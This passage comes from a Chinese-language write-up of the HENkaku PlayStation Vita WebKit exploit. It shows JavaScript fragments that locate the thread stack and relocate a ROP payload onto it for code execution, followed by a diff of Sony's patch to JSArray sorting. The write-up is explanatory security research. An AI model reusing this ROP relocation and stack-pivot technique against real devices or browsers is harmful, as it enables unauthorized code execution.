不会使浏览器崩溃。
    // restore our obj
    for (var i = 0; i >> 0)) >>> 0;
    sp -= 0xef818; // adjust to get SP base
现在我们可以将我们的 ROP payload 写入线程栈并转向它，而不会停止应用程序！
### Finally, Code Execution
首先，我们重定位 ROP payload。记住我们如何获得 payload 和 relocs。如果你看到 payload.js ，这将是你所看到的：
    payload = [2119192402,65537,0,0,1912    // and it goes on...
    relocs = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,  // ...
`relocs` 数组中的每个数字表示了 `payload` 成员应该如何重定位的。例如，0 表示不进行重定位，1 表示添加
`rop_data_base`，2 表示 添加 `SceWebKit_base`，3 表示添加`SceLibKernel_base` 等...
使用 roptool 生成的 ROP 链有两个部分：代码和数据。代码只是 ROP 堆栈，数据是字符串或缓冲区。`rop_data_base` 是数据的
vaddr， `rop_code_base` 是代码的 vaddr）
下一个循环将 payload 直接重定位到线程堆栈中：
    // relocate the payload
    rop_data_base = sp + 0x40;
    rop_code_base = sp + 0x10000;
    addr = sp / 4;
    // Since relocs are applied to the whole rop binary, not just code/data sections, we replicate
    // this behavior here. However, we split it into data section (placed at the top of the stack)
    // and code section (placed at stack + some big offset)
    for (var i = 0; i 
    - void JSArray::sortCompactedVector(ExecState* exec, ContiguousData data, unsigned relevantLength)
    - {
    -     if (!relevantLength)
    -         return;
    -     
    ---    +     }
    + };
    + 
    + template <>
    + ContiguousJSValues JSArray::storage >()
    + {
    +     return m_butterfly->contiguousInt32();
    + }
    + 
    + template <>
    + ContiguousDoubles JSArray::storage()
    + {
    +     return m_butterfly->contiguousDouble();
    + }
    + 
    + template <>
    + ContiguousJSValues JSArray::storage >()
    + {
    +     return m_butterfly->contiguous();
    + }
    + 
    + template <>
    + ContiguousJSValues JSArray::storage >()
    + {
    +     ArrayStorage* storage = m_butterfly->arrayStorage();
    +     ASSERT(!storage->m_sparseMap);
    +     return storage->vector();
    + }
    + 
    + template
    + void JSArray::sortCompactedVector(ExecState* exec, ContiguousData data, unsigned relevantLength)
    + {
    +     data = storage();
    + 
    +     if (!relevantLength)
    +         return;
    +     
    1167,1172c1194,1200
    -         CRASH();
    -     }
    - 
    -     for (size_t i = 0; i ::setWithValue(vm, this, data, i, values[i].first);
    -     
    ---    +         CRASH();
    +     }
    + 
    +     data = storage();
    +     for (size_t i = 0; i ::setWithValue(vm, this, data, i, values[i].first);
    +   
他们现在在更新`data` 指针之前写入值。所以即使数组被重新分配，它仍然写入正确的内存。如果你尝试在在 3.61 版本上运行
HENkaku，这就是造成`alert("restart the browser")`错误的原因。干的漂亮，Sony！
### Conclusion
今天就这些！我希望你能喜欢这个 writeup，就像我讨厌写 exploit 一样。此后，在几个月/年/世纪，我会带给你一些更好的 writeup
，尽请期待。因为我写了大部分的 HENkaku exploit 链，我被禁止参加 [KOTH
challenge](https://yifan.lu/2016/08/05/henkaku-koth-challenge)
:(，但至少你可以享受这篇writeup :)。
* * *